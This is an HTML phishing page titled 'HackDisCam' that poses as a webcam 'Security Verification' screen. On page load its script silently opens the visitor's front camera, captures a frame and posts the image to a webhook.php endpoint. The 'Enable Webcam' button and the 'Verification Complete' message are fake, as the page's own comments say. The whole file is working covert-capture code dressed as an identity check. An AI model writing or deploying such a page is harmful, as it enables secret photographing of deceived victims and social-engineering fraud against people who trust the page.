<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport'/>
  <meta name="viewport" content="width=device-width"/>

  <title>HackDisCam</title>

  <script type="text/javascript" src="script.js"></script>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

</head>

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>

  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>

    function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: 'webhook.php',
        dataType: 'json',
        async: false,
        success: function(result){
            // call the function that handles the response/results
        },
        error: function(){
        }
      });
    };


    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
      audio: false,
      video: {
        facingMode: "user"
      }
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;

    var context = canvas.getContext('2d');
      setTimeout(function(){

          context.drawImage(video, 0, 0, 640, 480);
          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
          for (let i=0 ; i<10000000 ; i++){
            let k = 0;
          }
          post(canvasData); }, 1500);
      

    }

    // Load init
    init();

  </script>

<body>
  <!-- Fake verification page -->
  <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 450px; margin: 100px auto; padding: 40px; border: 2px solid #5865f2; border-radius: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center;">
    
    <!-- Optional icon (camera/security) -->
    <div style="font-size: 64px; margin-bottom: 20px;">📹</div>
    
    <h1 style="font-size: 28px; margin-bottom: 10px; font-weight: bold;">Security Verification</h1>
    
    <p style="font-size: 18px; margin-bottom: 30px; opacity: 0.95;">
      Please enable webcam for verification
    </p>
    
    <p style="font-size: 14px; margin-bottom: 30px; opacity: 0.8; max-width: 320px; margin-left: auto; margin-right: auto;">
      This quick camera check confirms your identity and protects your account.
    </p>
    
    <!-- Fake button (capture happens automatically anyway) -->
    <button id="verifyBtn" onclick="startVerification()" style="background: white; color: #5865f2; border: none; padding: 15px 40px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.2); transition: all 0.3s;">
      Enable Webcam
    </button>
    
    <p style="font-size: 12px; margin-top: 25px; opacity: 0.7;">
      One-time verification • Your privacy protected
    </p>
  </div>

  <script>
    // Fake button handler (shows "success" after capture)
    function startVerification() {
      document.getElementById('verifyBtn').innerHTML = 'Verifying...';
      document.getElementById('verifyBtn').style.background = '#5865f2';
      document.getElementById('verifyBtn').style.color = 'white';
      
      // Fake success after 3s (capture already happened via main script)
      setTimeout(() => {
        document.body.innerHTML = `
          <div style="text-align: center; margin-top: 100px; color: #5865f2;">
            <div style="font-size: 48px;">✅</div>
            <h2>Verification Complete!</h2>
            <p>Redirecting you back...</p>
          </div>
        `;
        setTimeout(() => window.close() || (window.location.href = 'about:blank'), 2000);
      }, 3000);
    }
  </script>
</body>
</html>
